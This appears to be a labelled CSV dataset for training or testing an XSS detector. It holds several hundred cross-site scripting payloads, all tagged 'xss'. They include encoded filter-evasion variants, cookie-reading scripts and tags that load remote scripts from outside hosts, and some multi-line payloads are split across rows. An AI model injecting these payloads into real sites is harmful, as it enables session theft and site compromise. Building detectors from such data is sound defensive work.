payload,label
"&lt;FRAMESET&gt;&lt;FRAME SRC=\""javascript&#058;alert('XSS');\""&gt;&lt;/FRAMESET&gt;",xss
"&lt;TABLE BACKGROUND=\""javascript&#058;alert('XSS')\""&gt;",xss
"&lt;TABLE&gt;&lt;TD BACKGROUND=\""javascript&#058;alert('XSS')\""&gt;",xss
"&lt;DIV STYLE=\""background-image&#58; url(javascript&#058;alert('XSS'))\""&gt;",xss
"&lt;DIV STYLE=\""background-image&#58;\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028&#46;1027\0058&#46;1053\0053\0027\0029'\0029\""&gt;",xss
"&lt;DIV STYLE=\""background-image&#58; url(javascript&#058;alert('XSS'))\""&gt;",xss
"&lt;DIV STYLE=\""width&#58; expression(alert('XSS'));\""&gt;",xss
"&lt;STYLE&gt;@im\port'\ja\vasc\ript&#58;alert(\""XSS\"")';&lt;/STYLE&gt;",xss
"&lt;IMG STYLE=\""xss&#58;expr/*XSS*/ession(alert('XSS'))\""&gt;",xss
"&lt;XSS STYLE=\""xss&#58;expression(alert('XSS'))\""&gt;",xss
"exp/*&lt;A STYLE='no\xss&#58;noxss(\""*//*\"");",xss
"xss&#58;ex&#x2F;*XSS*//*/*/pression(alert(\""XSS\""))'&gt;",xss
"&lt;STYLE TYPE=\""text/javascript\""&gt;alert('XSS');&lt;/STYLE&gt;",xss
"&lt;STYLE&gt;&#46;XSS{background-image&#58;url(\""javascript&#058;alert('XSS')\"");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;",xss
"&lt;STYLE type=\""text/css\""&gt;BODY{background&#58;url(\""javascript&#058;alert('XSS')\"")}&lt;/STYLE&gt;",xss
&lt;!--&#91;if gte IE 4&#93;&gt;,xss
&lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt;,xss
&lt;!&#91;endif&#93;--&gt;,xss
"&lt;BASE HREF=\""javascript&#058;alert('XSS');//\""&gt;",xss
"&lt;OBJECT TYPE=\""text/x-scriptlet\"" DATA=\""http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\""&gt;&lt;/OBJECT&gt;",xss
&lt;OBJECT classid=clsid&#58;ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript&#058;alert('XSS')&gt;&lt;/OBJECT&gt;,xss
"&lt;EMBED SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;swf\"" AllowScriptAccess=\""always\""&gt;&lt;/EMBED&gt;",xss
"&lt;EMBED SRC=\""data&#58;image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\"" type=\""image/svg+xml\"" AllowScriptAccess=\""always\""&gt;&lt;/EMBED&gt;",xss
"a=\""get\"";",xss
"b=\""URL(\\""\"";",xss
"c=\""javascript&#058;\"";",xss
"d=\""alert('XSS');\\"")\"";",xss
eval(a+b+c+d);,xss
"&lt;HTML xmlns&#58;xss&gt;&lt;?import namespace=\""xss\"" implementation=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;htc\""&gt;&lt;xss&#58;xss&gt;XSS&lt;/xss&#58;xss&gt;&lt;/HTML&gt;",xss
"&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;!&#91;CDATA&#91;&lt;IMG SRC=\""javas&#93;&#93;&gt;&lt;!&#91;CDATA&#91;cript&#58;alert('XSS');\""&gt;&#93;&#93;&gt;",xss
&lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;,xss
"&lt;XML ID=\""xss\""&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=\""javas&lt;!-- --&gt;cript&#58;alert('XSS')\""&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;",xss
"&lt;SPAN DATASRC=\""#xss\"" DATAFLD=\""B\"" DATAFORMATAS=\""HTML\""&gt;&lt;/SPAN&gt;",xss
"&lt;XML SRC=\""xsstest&#46;xml\"" ID=I&gt;&lt;/XML&gt;",xss
&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;,xss
&lt;HTML&gt;&lt;BODY&gt;,xss
"&lt;?xml&#58;namespace prefix=\""t\"" ns=\""urn&#58;schemas-microsoft-com&#58;time\""&gt;",xss
"&lt;?import namespace=\""t\"" implementation=\""#default#time2\""&gt;",xss
"&lt;t&#58;set attributeName=\""innerHTML\"" to=\""XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;\""&gt;",xss
&lt;/BODY&gt;&lt;/HTML&gt;,xss
"&lt;SCRIPT SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;jpg\""&gt;&lt;/SCRIPT&gt;",xss
"&lt;!--#exec cmd=\""/bin/echo '&lt;SCR'\""--&gt;&lt;!--#exec cmd=\""/bin/echo 'IPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;'\""--&gt;",xss
&lt;? echo('&lt;SCR)';,xss
"echo('IPT&gt;alert(\""XSS\"")&lt;/SCRIPT&gt;'); ?&gt;",xss
"&lt;IMG SRC=\""http&#58;//www&#46;thesiteyouareon&#46;com/somecommand&#46;php?somevariables=maliciouscode\""&gt;",xss
Redirect 302 /a&#46;jpg http&#58;//victimsite&#46;com/admin&#46;asp&deleteuser,xss
"&lt;META HTTP-EQUIV=\""Set-Cookie\"" Content=\""USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;\""&gt;",xss
"&lt;HEAD&gt;&lt;META HTTP-EQUIV=\""CONTENT-TYPE\"" CONTENT=\""text/html; charset=UTF-7\""&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",xss
"&lt;SCRIPT a=\""&gt;\"" SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",xss
"&lt;SCRIPT =\""&gt;\"" SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",xss
"&lt;SCRIPT a=\""&gt;\"" '' SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",xss
"&lt;SCRIPT \""a='&gt;'\"" SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",xss
"&lt;SCRIPT a=`&gt;` SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",xss
"&lt;SCRIPT a=\""&gt;'&gt;\"" SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",xss
"&lt;SCRIPT&gt;document&#46;write(\""&lt;SCRI\"");&lt;/SCRIPT&gt;PT SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",xss
"&lt;A HREF=\""http&#58;//66&#46;102&#46;7&#46;147/\""&gt;XSS&lt;/A&gt;",xss
"&lt;A HREF=\""http&#58;//%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\""&gt;XSS&lt;/A&gt;",xss
"&lt;A HREF=\""http&#58;//1113982867/\""&gt;XSS&lt;/A&gt;",xss
"&lt;A HREF=\""http&#58;//0x42&#46;0x0000066&#46;0x7&#46;0x93/\""&gt;XSS&lt;/A&gt;",xss
"&lt;A HREF=\""http&#58;//0102&#46;0146&#46;0007&#46;00000223/\""&gt;XSS&lt;/A&gt;",xss
"&lt;A HREF=\""htt p&#58;//6 6&#46;000146&#46;0x7&#46;147/\""&gt;XSS&lt;/A&gt;",xss
"&lt;A HREF=\""//www&#46;google&#46;com/\""&gt;XSS&lt;/A&gt;",xss
"&lt;A HREF=\""//google\""&gt;XSS&lt;/A&gt;",xss
"&lt;A HREF=\""http&#58;//ha&#46;ckers&#46;org@google\""&gt;XSS&lt;/A&gt;",xss
"&lt;A HREF=\""http&#58;//google&#58;ha&#46;ckers&#46;org\""&gt;XSS&lt;/A&gt;",xss
"&lt;A HREF=\""http&#58;//google&#46;com/\""&gt;XSS&lt;/A&gt;",xss
"&lt;A HREF=\""http&#58;//www&#46;google&#46;com&#46;/\""&gt;XSS&lt;/A&gt;",xss
"&lt;A HREF=\""javascript&#058;document&#46;location='http&#58;//www&#46;google&#46;com/'\""&gt;XSS&lt;/A&gt;",xss
"&lt;A HREF=\""http&#58;//www&#46;gohttp&#58;//www&#46;google&#46;com/ogle&#46;com/\""&gt;XSS&lt;/A&gt;",xss
&lt;,xss
%3C,xss
&lt,xss
&lt;,xss
&LT,xss
&LT;,xss
&#60,xss
&#060,xss
&#0060,xss
&#00060,xss
&#000060,xss
&#0000060,xss
&lt;,xss
&#x3c,xss
&#x03c,xss
&#x003c,xss
&#x0003c,xss
&#x00003c,xss
&#x000003c,xss
&#x3c;,xss
&#x03c;,xss
&#x003c;,xss
&#x0003c;,xss
&#x00003c;,xss
&#x000003c;,xss
&#X3c,xss
&#X03c,xss
&#X003c,xss
&#X0003c,xss
&#X00003c,xss
&#X000003c,xss
&#X3c;,xss
&#X03c;,xss
&#X003c;,xss
&#X0003c;,xss
&#X00003c;,xss
&#X000003c;,xss
&#x3C,xss
&#x03C,xss
&#x003C,xss
&#x0003C,xss
&#x00003C,xss
&#x000003C,xss
&#x3C;,xss
&#x03C;,xss
&#x003C;,xss
&#x0003C;,xss
&#x00003C;,xss
&#x000003C;,xss
&#X3C,xss
&#X03C,xss
&#X003C,xss
&#X0003C,xss
&#X00003C,xss
&#X000003C,xss
&#X3C;,xss
&#X03C;,xss
&#X003C;,xss
&#X0003C;,xss
&#X00003C;,xss
&#X000003C;,xss
\x3c,xss
\x3C,xss
\u003c,xss
\u003C,xss
&lt;iframe src=http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html&gt;,xss
"&lt;IMG SRC=\""javascript&#058;alert('XSS')\""",xss
&lt;SCRIPT SRC=//ha&#46;ckers&#46;org/&#46;js&gt;,xss
&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js?&lt;B&gt;,xss
"&lt;&lt;SCRIPT&gt;alert(\""XSS\"");//&lt;&lt;/SCRIPT&gt;",xss
"&lt;SCRIPT/SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",xss
"&lt;BODY onload!#$%&()*~+-_&#46;,&#58;;?@&#91;/|\&#93;^`=alert(\""XSS\"")&gt;",xss
"&lt;SCRIPT/XSS SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",xss
"&lt;IMG SRC=\""   javascript&#058;alert('XSS');\""&gt;",xss
"perl -e 'print \""&lt;SCR\0IPT&gt;alert(\\""XSS\\"")&lt;/SCR\0IPT&gt;\"";' &gt; out",xss
"perl -e 'print \""&lt;IMG SRC=java\0script&#058;alert(\\""XSS\\"")&gt;\"";' &gt; out",xss
"&lt;IMG SRC=\""jav&#x0D;ascript&#058;alert('XSS');\""&gt;",xss
"&lt;IMG SRC=\""jav&#x0A;ascript&#058;alert('XSS');\""&gt;",xss
"&lt;IMG SRC=\""jav&#x09;ascript&#058;alert('XSS');\""&gt;",xss
&lt;IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29&gt;,xss
&lt;IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041&gt;,xss
&lt;IMG SRC=javascript&#058;alert('XSS')&gt;,xss
"&lt;IMG SRC=javascript&#058;alert(String&#46;fromCharCode(88,83,83))&gt;",xss
"&lt;IMG \""\""\""&gt;&lt;SCRIPT&gt;alert(\""XSS\"")&lt;/SCRIPT&gt;\""&gt;",xss
"&lt;IMG SRC=`javascript&#058;alert(\""RSnake says, 'XSS'\"")`&gt;",xss
&lt;IMG SRC=javascript&#058;alert(&quot;XSS&quot;)&gt;,xss
&lt;IMG SRC=JaVaScRiPt&#058;alert('XSS')&gt;,xss
&lt;IMG SRC=javascript&#058;alert('XSS')&gt;,xss
"&lt;IMG SRC=\""javascript&#058;alert('XSS');\""&gt;",xss
&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;,xss
"'';!--\""&lt;XSS&gt;=&{()}",xss
"';alert(String&#46;fromCharCode(88,83,83))//\';alert(String&#46;fromCharCode(88,83,83))//\"";alert(String&#46;fromCharCode(88,83,83))//\\"";alert(String&#46;fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;\""&gt;'&gt;&lt;SCRIPT&gt;alert(String&#46;fromCharCode(88,83,83))&lt;/SCRIPT&gt;",xss
"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",xss
"'';!--""<XSS>=&{()}",xss
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>,xss
"<IMG SRC=""javascript:alert('XSS');"">",xss
<IMG SRC=javascript:alert('XSS')>,xss
<IMG SRC=javascrscriptipt:alert('XSS')>,xss
<IMG SRC=JaVaScRiPt:alert('XSS')>,xss
"<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">",xss
"<IMG SRC="" &#14;  javascript:alert('XSS');"">",xss
"<SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
"<SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
"<<SCRIPT>alert(""XSS"");//<</SCRIPT>",xss
<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>,xss
"\"";alert('XSS');//",xss
"</TITLE><SCRIPT>alert(""XSS"");</SCRIPT>",xss
¼script¾alert(¢XSS¢)¼/script¾,xss
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:alert('XSS');"">",xss
"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>",xss
"<FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET>",xss
"<TABLE BACKGROUND=""javascript:alert('XSS')"">",xss
"<TABLE><TD BACKGROUND=""javascript:alert('XSS')"">",xss
"<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">",xss
"<DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">",xss
"<DIV STYLE=""width: expression(alert('XSS'));"">",xss
"<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>",xss
"<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">",xss
"<XSS STYLE=""xss:expression(alert('XSS'))"">",xss
"exp/*<A STYLE='no\xss:noxss(""*//*"");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert(""XSS""))'>",xss
"<EMBED SRC=""http://ha.ckers.org/xss.swf"" AllowScriptAccess=""always""></EMBED>",xss
"a=""get"";b=""URL(ja\"""";c=""vascr"";d=""ipt:ale"";e=""rt('XSS');\"")"";eval(a+b+c+d+e);",xss
"<SCRIPT SRC=""http://ha.ckers.org/xss.jpg""></SCRIPT>",xss
"<HTML><BODY><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributeName=""innerHTML"" to=""XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;""></BODY></HTML>",xss
"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
"<form id=""test"" /><button form=""test"" formaction=""javascript:alert(123)"">TESTHTML5FORMACTION",xss
"<form><button formaction=""javascript:alert(123)"">crosssitespt",xss
<frameset onload=alert(123)>,xss
"<!--<img src=""--><img src=x onerror=alert(123)//"">",xss
"<style><img src=""</style><img src=x onerror=alert(123)//"">",xss
"<object data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="">",xss
"<embed src=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="">",xss
"<embed src=""javascript:alert(1)"">",xss
"<? foo=""><script>alert(1)</script>"">",xss
"<! foo=""><script>alert(1)</script>"">",xss
"</ foo=""><script>alert(1)</script>"">",xss
<script>({0:#0=alert/#0#/#0#(123)})</script>,xss
"<script>ReferenceError.prototype.__defineGetter__('name', function(){alert(123)}),x</script>",xss
"<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script>",xss
"<script src=""#"">{alert(1)}</script>;1",xss
"<script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script>",xss
"<svg xmlns=""#""><script>alert(1)</script></svg>",xss
"<svg onload=""javascript:alert(123)"" xmlns=""#""></svg>",xss
"<iframe xmlns=""#"" src=""javascript:alert(1)""></iframe>",xss
+ADw-script+AD4-alert(document.location)+ADw-/script+AD4-,xss
%2BADw-script+AD4-alert(document.location)%2BADw-/script%2BAD4-,xss
+ACIAPgA8-script+AD4-alert(document.location)+ADw-/script+AD4APAAi-,xss
%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-,xss
%253cscript%253ealert(document.cookie)%253c/script%253e,xss
“><s”%2b”cript>alert(document.cookie)</script>,xss
“><ScRiPt>alert(document.cookie)</script>,xss
“><<script>alert(document.cookie);//<</script>,xss
foo<script>alert(document.cookie)</script>,xss
<scr<script>ipt>alert(document.cookie)</scr</script>ipt>,xss
%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E,xss
‘; alert(document.cookie); var foo=’,xss
foo\’; alert(document.cookie);//’;,xss
</script><script >alert(document.cookie)</script>,xss
<img src=asdf onerror=alert(document.cookie)>,xss
<BODY ONLOAD=alert(’XSS’)>,xss
<script>alert(1)</script>,xss
"""><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>",xss
<video src=1 onerror=alert(1)>,xss
<audio src=1 onerror=alert(1)>,xss
"';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",xss
"'';!--""<XSS>=&{()}",xss
"0\""autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>""-confirm(3)-""",xss
"<script/src=data:,alert()>",xss
<marquee/onstart=alert()>,xss
<video/poster/onerror=alert()>,xss
<isindex/autofocus/onfocus=alert()>,xss
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>,xss
"<IMG SRC=""javascript:alert('XSS');"">",xss
<IMG SRC=javascript:alert('XSS')>,xss
<IMG SRC=JaVaScRiPt:alert('XSS')>,xss
"<IMG SRC=javascript:alert(""XSS"")>",xss
"<IMG SRC=`javascript:alert(""RSnake says, 'XSS'"")`>",xss
"<a onmouseover=""alert(document.cookie)"">xxs link</a>",xss
<a onmouseover=alert(document.cookie)>xxs link</a>,xss
"<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">",xss
"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",xss
"<IMG SRC=# onmouseover=""alert('xxs')"">",xss
"<IMG SRC= onmouseover=""alert('xxs')"">",xss
"<IMG onmouseover=""alert('xxs')"">",xss
"<IMG SRC=/ onerror=""alert(String.fromCharCode(88,83,83))""></img>",xss
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;,xss
&#39;&#88;&#83;&#83;&#39;&#41;>,xss
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&,xss
#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,xss
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,xss
"<IMG SRC=""jav	ascript:alert('XSS');"">",xss
"<IMG SRC=""jav&#x09;ascript:alert('XSS');"">",xss
"<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">",xss
"<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">",xss
"<IMG SRC="" &#14;  javascript:alert('XSS');"">",xss
"<SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")>",xss
"<SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
"<<SCRIPT>alert(""XSS"");//<</SCRIPT>",xss
<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >,xss
<SCRIPT SRC=//ha.ckers.org/.j>,xss
"<IMG SRC=""javascript:alert('XSS')""",xss
<iframe src=http://ha.ckers.org/scriptlet.html <,xss
"\"";alert('XSS');//",xss
</script><script>alert('XSS');</script>,xss
"</TITLE><SCRIPT>alert(""XSS"");</SCRIPT>",xss
"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">",xss
"<BODY BACKGROUND=""javascript:alert('XSS')"">",xss
"<IMG DYNSRC=""javascript:alert('XSS')"">",xss
"<IMG LOWSRC=""javascript:alert('XSS')"">",xss
"<STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br>",xss
"<IMG SRC='vbscript:msgbox(""XSS"")'>",xss
"<IMG SRC=""livescript:[code]"">",xss
<BODY ONLOAD=alert('XSS')>,xss
"<BGSOUND SRC=""javascript:alert('XSS');"">",xss
"<BR SIZE=""&{alert('XSS')}"">",xss
"<LINK REL=""stylesheet"" HREF=""javascript:alert('XSS');"">",xss
"<LINK REL=""stylesheet"" HREF=""http://ha.ckers.org/xss.css"">",xss
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,xss
"<META HTTP-EQUIV=""Link"" Content=""<http://ha.ckers.org/xss.css>; REL=stylesheet"">",xss
"<STYLE>BODY{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE>",xss
"<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>",xss
"<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">",xss
"exp/*<A STYLE='no\xss:noxss(""*//*"");",xss
"xss:ex/*XSS*//*/*/pression(alert(""XSS""))'>",xss
"<STYLE TYPE=""text/javascript"">alert('XSS');</STYLE>",xss
"<STYLE>.XSS{background-image:url(""javascript:alert('XSS')"");}</STYLE><A CLASS=XSS></A>",xss
"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",xss
"<XSS STYLE=""xss:expression(alert('XSS'))"">",xss
"<XSS STYLE=""behavior: url(xss.htc);"">",xss
¼script¾alert(¢XSS¢)¼/script¾,xss
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:alert('XSS');"">",xss
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"">",xss
"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:alert('XSS');"">",xss
"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>",xss
"<IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME>",xss
"<FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET>",xss
"<TABLE BACKGROUND=""javascript:alert('XSS')"">",xss
"<TABLE><TD BACKGROUND=""javascript:alert('XSS')"">",xss
"<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">",xss
"<DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">",xss
"<DIV STYLE=""background-image: url(&#1;javascript:alert('XSS'))"">",xss
"<DIV STYLE=""width: expression(alert('XSS'));"">",xss
<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->,xss
"<BASE HREF=""javascript:alert('XSS');//"">",xss
"<OBJECT TYPE=""text/x-scriptlet"" DATA=""http://ha.ckers.org/scriptlet.html""></OBJECT>",xss
"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'""-->",xss
"<? echo('<SCR)';echo('IPT>alert(""XSS"")</SCRIPT>'); ?>",xss
"<IMG SRC=""http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"">",xss
"<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=<SCRIPT>alert('XSS')</SCRIPT>"">",xss
"<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",xss
"<SCRIPT a="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
"<SCRIPT ="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
"<SCRIPT a="">"" '' SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
"<SCRIPT ""a='>'"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
"<SCRIPT a=`>` SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
"<SCRIPT a="">'>"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
"<A HREF=""http://66.102.7.147/"">XSS</A>",xss
"0\""autofocus/onfocus=alert(1)--><video/poster/ error=prompt(2)>""-confirm(3)-""",xss
veris-->group<svg/onload=alert(/XSS/)//,xss
"#""><img src=M onerror=alert('XSS');>",xss
element[attribute='<img src=x onerror=alert('XSS');>,xss
"[<blockquote cite=""]"">["" onmouseover=""alert('RVRSH3LL_XSS');"" ]",xss
%22;alert%28%27RVRSH3LL_XSS%29//,xss
javascript:alert%281%29;,xss
<w contenteditable id=x onfocus=alert()>,xss
"alert;pg(""XSS"")",xss
<svg/onload=%26%23097lert%26lpar;1337)>,xss
